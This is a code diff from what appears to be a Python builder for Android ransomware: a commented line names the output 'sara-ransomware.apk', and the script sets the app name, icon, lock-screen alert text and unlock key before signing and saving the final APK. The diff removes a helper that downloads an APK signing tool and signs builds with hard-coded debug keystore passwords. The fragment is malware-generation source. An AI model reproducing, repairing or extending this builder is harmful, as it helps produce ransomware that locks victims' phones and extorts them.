@@ -47,18 +47,6 @@ def writefile(file,old,new):
             break
         else: exit(r+"[!]"+w+" Failed to write in file "+file)
 
-def signer(apk):
-    while True:
-        if os.path.isfile(apk):
-            if not os.path.isfile("debug.jks"): exit(r+"[!}"+w+" Keystore file 'debug.jks' not found")
-            if not os.path.isfile("ubersigner.jar"): os.system("wget -O ubersigner.jar -q https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar")
-            os.system(f"java -jar ubersigner.jar -a {apk} --ks keystore.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
-            os.system(f"java -jar ubersigner.jar -a {apk} --onlyVerify > /dev/null 2>&1")
-            print("I: Siging final APK's ...")
-            #print("R: Results saved as "+r+"sara-ransomware.apk"+w)
-            break
-        else: exit()
-
 def start():
     global app_icon, app_name, alert_title, alert_desc, key_pass
     os.system("clear")
@@ -149,9 +137,7 @@ def start():
         os.system("mv final-aligned-signed.apk "+out)
         getpass(b+">"+w+" Result saved as:  "+B+" "+out+" "+w)
     else: print(r+"[!]"+w+" Failed to signed APK's")
-    
-    
-    
+
 if __name__ == "__main__":
     try:
         start()
